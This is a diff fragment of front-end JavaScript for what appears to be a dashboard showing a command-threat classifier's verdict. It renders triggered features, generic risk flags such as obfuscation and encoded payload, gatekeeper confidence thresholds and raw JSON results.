+      const trig = ev.triggered_features || d.triggered_features || [];
+      if (trig.length) {
+        html += `<div class="sub-panel"><div class="sub-panel-title">Triggered features</div><div class="tag-list">${tags(trig)}</div></div>`;
+      }
+
+      const boolFlags = [
+        ['pipe', ev.has_pipe],
+        ['redirect', ev.has_redirect],
+        ['chain', ev.has_chain],
+        ['inline code', ev.inline_code],
+        ['encoded payload', ev.uses_encoded_payload],
+        ['obfuscation', ev.uses_obfuscation],
+        ['signed proxy binary', ev.uses_signed_proxy_binary],
+      ];
+      const activeBools = boolFlags.filter(([,v]) => v === true);
+      if (activeBools.length) {
+        html += `<div class="sub-panel"><div class="sub-panel-title">Active flags</div><div class="bool-row">${activeBools.map(([k]) => `<span class="bool-flag on">${escHtml(k)}</span>`).join('')}</div></div>`;
+      }
+
+      ec.innerHTML = html;
+      show('evidenceSection');
+    } else {
+      hide('evidenceSection');
+    }
+
+    // ── Tier 3: Gatekeeper (collapsed) ──
+    const gk = d.gatekeeper;
+    if (gk) {
+      const gc = document.getElementById('gatekeeperContent');
+      let html = '';
+      const gkRows = [
+        kvRow('Decision mode', gk.decision_mode),
+        kvRow('Model view', gk.model_view),
+        kvRow('Top label', gk.model_top_public_label),
+        kvRow('Top confidence', gk.model_top_confidence != null ? gk.model_top_confidence + '%' : null),
+        kvRow('Runner-up label', gk.model_second_public_label),
+        kvRow('Runner-up confidence', gk.model_second_confidence != null ? gk.model_second_confidence + '%' : null),
+      ].filter(Boolean).join('');
+      if (gkRows) html += `<div class="kv-grid" style="margin-bottom:.75rem">${gkRows}</div>`;
+      if (gk.thresholds) {
+        const t = gk.thresholds;
+        const threshRows = [
+          kvRow('Benign threshold', t.benign_conf_threshold),
+          kvRow('Suspicious threshold', t.suspicious_conf_threshold),
+          kvRow('Malicious threshold', t.malicious_conf_threshold),
+          kvRow('Low margin threshold', t.low_margin_threshold),
+          kvRow('High-risk override', t.high_risk_override_enabled ? 'enabled' : 'disabled'),
+          kvRow('Suspicious fallback', t.suspicious_fallback_enabled ? 'enabled' : 'disabled'),
+        ].filter(Boolean).join('');
+        if (threshRows) {
+          html += `<div class="sub-panel"><div class="sub-panel-title">Thresholds</div><div class="kv-grid">${threshRows}</div></div>`;
+        }
+      }
+      gc.innerHTML = html;
+      show('gatekeeperSection');
+    } else {
+      hide('gatekeeperSection');
+    }
+
+    // ── Tier 3: Meta (collapsed) ──
+    const metaGrid = document.getElementById('metaGrid');
+    metaGrid.innerHTML = '';
+    const metaFields = [
+      ['attack_stage', 'Attack stage'],
+      ['severity', 'Severity'],
+      ['elapsed_ms', 'Inference time'],
+    ];
+    let hasMeta = false;
+    for (const [key, lbl] of metaFields) {
+      if (d[key] != null) {
+        hasMeta = true;
+        const val = key === 'elapsed_ms' ? d[key] + ' ms' : d[key];
+        metaGrid.innerHTML += kvRow(lbl, val);
+      }
+    }
+    hasMeta ? show('metaSection') : hide('metaSection');
+
+    // ── Raw JSON ──
+    document.getElementById('rawJson').textContent = JSON.stringify(d, null, 2);
+  }
+</script>
+</body>
+</html>
